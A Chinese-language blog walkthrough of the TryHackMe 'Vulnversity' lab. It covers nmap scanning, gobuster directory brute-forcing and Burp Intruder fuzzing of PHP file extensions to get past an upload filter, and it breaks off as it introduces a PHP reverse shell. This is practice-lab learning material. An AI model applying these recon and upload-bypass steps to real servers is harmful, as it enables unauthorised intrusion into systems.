<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145163.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145164.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145165.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145166.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145167.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145168.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145169.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145170.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145171.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145172.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145173.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145174.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145175.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145176.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145177.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145178.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145179.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145180.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145181.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145182.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145183.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145184.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145185.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145186.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145187.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145188.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145189.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145190.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145191.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145192.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145193.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145194.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145195.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145196.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145197.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145198.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145199.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145200.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145201.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145202.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145203.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145204.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145205.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145206.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145207.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145208.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145209.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145210.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145211.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145212.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145213.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145214.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145215.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145216.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145217.png">
<meta property="article:published_time" content="2024-03-29T00:16:14.511Z">
<meta property="article:modified_time" content="2024-07-20T06:42:41.138Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="tryhackme">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839549.png">
  
  
  
  <meta name="keywords" content="tryhackme">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/07/25/thm-windows-api-jie-shao/"><span class="title">THM-Windows-API介绍</span></a><a class="item title" href="/2024/07/24/thm-windows-nei-he/"><span class="title">THM-Windows内核</span></a><a class="item title" href="/2024/07/20/thm-shu-ju-xie-lu/"><span class="title">THM-数据泄露</span></a><a class="item title" href="/2024/07/21/linux-ti-quan-zong-jie/"><span class="title">Linux提权总结</span></a><a class="item title" href="/2024/07/16/thm-enumeration/"><span class="title">THM-Enumeration</span></a><a class="item title" href="/2024/07/16/thm-dang-qian-tai-shi/"><span class="title">THM-当前态势</span></a><a class="item title" href="/2024/02/10/thm-linux-quan-xian-ti-sheng/"><span class="title">THM-Linux权限提升</span></a><a class="item title" href="/2024/02/14/thm-basic-pentesting/"><span class="title">THM-Basic Pentesting</span></a><a class="item title" href="/2024/07/20/linux-ti-quan-xue-xi-yi/"><span class="title">Linux提权学习之rbash逃逸</span></a><a class="item title" href="/2023/08/07/qian-xi-mu-lu-chuan-yue/"><span class="title">浅析目录穿越</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/tryhackme/">tryhackme</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-03-29T00:16:14.511Z">2024-03-29</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-20T06:42:41.138Z">2024-07-20</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>THM-进攻性渗透测试</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="0x01-vulnversity漏洞">0x01 vulnversity漏洞</h1>
<h2 id="侦查">侦查</h2>
<p>nmap扫描目标机</p>
<p>Nmap 是一个免费、开源且功能强大的工具，用于发现计算机网络上的主机和服务。在我们的示例中，我们使用 Nmap 扫描该计算机以识别特定端口上运行的所有服务。 Nmap 有很多功能；下面的表格总结了其一些功能。</p>
<table>
<thead>
<tr>
<th>Nmap</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>-sV</td>
<td>尝试确定正在运行的服务的版本</td>
</tr>
<tr>
<td>-p or -p- -</td>
<td>端口扫描端口 <x> 或扫描所有端口</x></td>
</tr>
<tr>
<td>-Pn</td>
<td>禁用主机发现并扫描开放端口</td>
</tr>
<tr>
<td>-A</td>
<td>启用操作系统和版本检测，执行内置脚本以进行进一步枚举</td>
</tr>
<tr>
<td>-sC</td>
<td>使用默认 Nmap 脚本扫描</td>
</tr>
<tr>
<td>-v</td>
<td>详细模式</td>
</tr>
<tr>
<td>-sU</td>
<td>UDP端口扫描</td>
</tr>
<tr>
<td>-sS</td>
<td>TCP SYN端口扫描</td>
</tr>
</tbody>
</table>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839549.png" alt="image-20240329082531210"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839551.png" alt="image-20240329082603574"></p>
<p>这里看文章hint说是，利用-O参数进行扫描，如下图所示，反而还不如上面的-sV选项有用（上面明确说是ubuntu OS）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839552.png" alt="image-20240329083230260"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839553.png" alt="image-20240329084631365"></p>
<h2 id="使用gobuste扫描目录">使用gobuste扫描目录</h2>
<p>使用名为 <code>Gobuster</code> 的快速目录发现工具，您将找到可用于上传 shell 的目录。让我们首先扫描网站以查找任何隐藏的目录。为此，我们将使用 Gobuster。</p>
<p>Gobuster 是一个用于暴力破解 URI（目录和文件）、DNS 子域和虚拟主机名的工具。对于这台机器，我们将重点使用它来暴力破解目录。</p>
<p>在这里下载 <a target="_blank" rel="noopener" href="https://github.com/OJ/gobuster">Gobuster</a>，或者如果您使用的是 Kali Linux，请运行 sudo apt-get install gobuster</p>
<p>首先，您需要一个 Gobuster 的单词列表（它将用于快速浏览单词列表以确定公共目录是否可用。如果您使用 Kali Linux，您可以在 /usr/share/wordlists 下找到许多单词列表）您还可以在 AttackBox 中使用位于 /usr/share/wordlists/dirbuster/directory-list-1.0.txt 的目录的单词列表。</p>
<p>现在让我们使用 gobuster dir -u <a target="_blank" rel="noopener" href="http://10.10.127.89:3333">http://10.10.127.89:3333</a> -w <word list location> 运行带有单词列表的 Gobuster</word></p>
<table>
<thead>
<tr>
<th>Gobuster flag</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>-e</td>
<td>在控制台中打印完整的 URL</td>
</tr>
<tr>
<td>-u</td>
<td>目标网址</td>
</tr>
<tr>
<td>-w</td>
<td>单词列表的路径</td>
</tr>
<tr>
<td>-U and -P</td>
<td>基本身份验证的用户名和密码</td>
</tr>
<tr>
<td>-p <strong><x></x></strong></td>
<td>用于请求的代理</td>
</tr>
<tr>
<td>-c <http cookies></http></td>
<td>指定一个 cookie 来模拟您的身份验证</td>
</tr>
</tbody>
</table>
<pre><code class="hljs scss">gobuster dir -u http://<span class="hljs-number">10.10</span>.<span class="hljs-number">127.89</span>:<span class="hljs-number">3333</span> -w /usr/share/wordlists/dirbuster/directory-list-<span class="hljs-number">1.0</span>.txt</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839554.png" alt="image-20240329090358992"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839555.png" alt="image-20240329090410555"></p>
<h2 id="入侵网络服务器">入侵网络服务器</h2>
<p>现在您已经找到了上传文件的表单，我们可以利用它来上传并执行我们的有效负载，这将导致网络服务器受到损害。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839556.png" alt="image-20240329085728352"></p>
<p>我们将使用 Intruder（用于自动化定制攻击）。首先，创建一个具有以下扩展名的单词列表：</p>
<ul>
<li>.php</li>
<li>.php3</li>
<li>.php4</li>
<li>.php5</li>
<li>.phtml</li>
</ul>
<p>现在确保 BurpSuite 配置为拦截所有浏览器流量。上传一个文件;一旦捕获该请求，将其发送给入侵者。单击“有效负载”并选择“狙击手”攻击类型。</p>
<p>现在单击“位置”选项卡，找到文件名并“添加§”到扩展名。它应该看起来像这样：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839557.png" alt="image-20240329090625398"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839558.png" alt="image-20240329090703625"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839559.png" alt="image-20240329091447177"></p>
<p>这里我还因为后缀被url编码导致一直出错。。。。现在我们知道可以为有效负载使用什么扩展，我们就可以继续前进了。</p>
<p>我们将使用 PHP 反向 shell 作为我们的有效负载。反向 shell 的工作原理是在远程主机上调用并强制该主机与您建立连接。因此，您将侦听传入的连接，上传并执行 shell，这将向您发出控制信号！</p>
